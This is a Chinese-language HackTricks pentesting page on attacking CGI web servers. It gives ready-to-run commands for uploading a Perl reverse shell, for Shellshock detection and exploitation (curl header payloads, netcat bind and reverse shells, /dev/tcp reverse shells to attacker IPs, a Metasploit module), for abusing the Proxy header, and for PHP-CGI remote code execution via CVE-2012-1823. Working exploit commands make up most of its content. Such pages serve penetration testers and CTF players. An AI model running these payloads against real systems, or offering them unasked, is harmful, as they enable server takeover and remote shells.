<details>

<summary><strong>零基础学习AWS黑客攻击成为英雄</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在 **HackTricks中看到您的公司广告** 或 **下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取 [**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现 [**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>


# 信息

**CGI脚本是perl脚本**，因此，如果您已经攻破了可以执行 _**.cgi**_ 脚本的服务器，您可以 **上传一个perl反向shell** \(`/usr/share/webshells/perl/perl-reverse-shell.pl`\)，将扩展名从 **.pl** 改为 **.cgi**，赋予 **执行权限** \(`chmod +x`\) 并通过 **网络浏览器访问** 反向shell以执行它。
为了测试 **CGI漏洞**，建议使用 `nikto -C all` \(及其所有插件\)

# **ShellShock**

Bash也可以用来运行应用程序传递给它的命令，而这个特性正是漏洞影响的地方。可以发送给Bash的一种命令类型允许设置环境变量。环境变量是动态的、命名的值，它们影响计算机上进程的运行方式。漏洞在于，**攻击者可以在环境变量中附加恶意代码，一旦变量被接收，代码就会运行**。

利用这个漏洞，**页面可能会抛出错误**。

您可以通过注意到它使用的是**旧版本的Apache**和**cgi\_mod** \(带有cgi文件夹\) 或使用 **nikto** 来**发现**这个漏洞。

## **测试**

大多数测试都是基于回显某些内容，并期望该字符串在网络响应中返回。如果您认为某个页面可能存在漏洞，请搜索所有的cgi页面并测试它们。

**Nmap**
```bash
nmap 10.2.1.31 -p 80 --script=http-shellshock --script-args uri=/cgi-bin/admin.cgi
```
## **Curl \(反射型、盲目型和带外\)**
```bash
# Reflected
curl -H 'User-Agent: () { :; }; echo "VULNERABLE TO SHELLSHOCK"' http://10.1.2.32/cgi-bin/admin.cgi 2>/dev/null| grep 'VULNERABLE'
# Blind with sleep (you could also make a ping or web request to yourself and monitor that oth tcpdump)
curl -H 'User-Agent: () { :; }; /bin/bash -c "sleep 5"' http://10.11.2.12/cgi-bin/admin.cgi
# Out-Of-Band Use Cookie as alternative to User-Agent
curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/10.10.10.10/4242 0>&1' http://10.10.10.10/cgi-bin/user.sh
```
[**Shellsocker**](https://github.com/liamim/shellshocker)
```bash
python shellshocker.py http://10.11.1.71/cgi-bin/admin.cgi
```
## 利用
```bash
#Bind Shell
$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 8
#Reverse shell
$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 192.168.159.1 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 80
#Reverse shell using curl
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.11.0.41/80 0>&1' http://10.1.2.11/cgi-bin/admin.cgi
#Reverse shell using metasploit
> use multi/http/apache_mod_cgi_bash_env_exec
> set targeturi /cgi-bin/admin.cgi
> set rhosts 10.1.2.11
> run
```
# **代理（MitM 到 Web 服务器请求）**

CGI 为 http 请求中的每个头创建一个环境变量。例如："host:web.com" 被创建为 "HTTP\_HOST"="web.com"

由于 HTTP\_PROXY 变量可能被 web 服务器使用。尝试发送包含 "**Proxy: &lt;IP\_attacker&gt;:&lt;PORT&gt;**" 的**头部**，如果服务器在会话期间执行任何请求。您将能够捕获服务器发出的每个请求。

# 旧 PHP + CGI = RCE（CVE-2012-1823，CVE-2012-2311）

基本上，如果 cgi 活跃并且 php 是“旧的”（&lt;5.3.12 / &lt; 5.4.2），你可以执行代码。
为了利用这个漏洞，你需要访问 web 服务器的某个 PHP 文件，而不发送参数（特别是不发送字符 "="）。
然后，为了测试这个漏洞，你可以访问例如 `/index.php?-s`（注意 `-s`），**应用程序的源代码将出现在响应中**。

然后，为了获得**RCE**，你可以发送这个特殊查询：`/?-d allow_url_include=1 -d auto_prepend_file=php://input` 和要在**请求体中执行的**PHP 代码。
**示例：**
```bash
curl -i --data-binary "<?php system(\"cat /flag.txt \") ?>" "http://jh2i.com:50008/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"
```
**关于漏洞和可能的利用方法的更多信息：** [**https://www.zero-day.cz/database/337/**](https://www.zero-day.cz/database/337/)**,** [**cve-2012-1823**](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2012-1823)**,** [**cve-2012-2311**](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2012-2311)**,** [**CTF Writeup 示例**](https://github.com/W3rni0/HacktivityCon_CTF_2020#gi-joe)**。**

<details>

<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>从零开始学习 AWS 黑客攻击直至成为高手！</strong></summary>

支持 HackTricks 的其他方式：

* 如果您希望在 **HackTricks 中看到您的公司广告** 或 **下载 HackTricks 的 PDF 版本**，请查看 [**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取 [**官方的 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 发现 [**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的 [**NFTs 集合**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上 **关注** 我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来 **分享您的黑客技巧**。

</details>
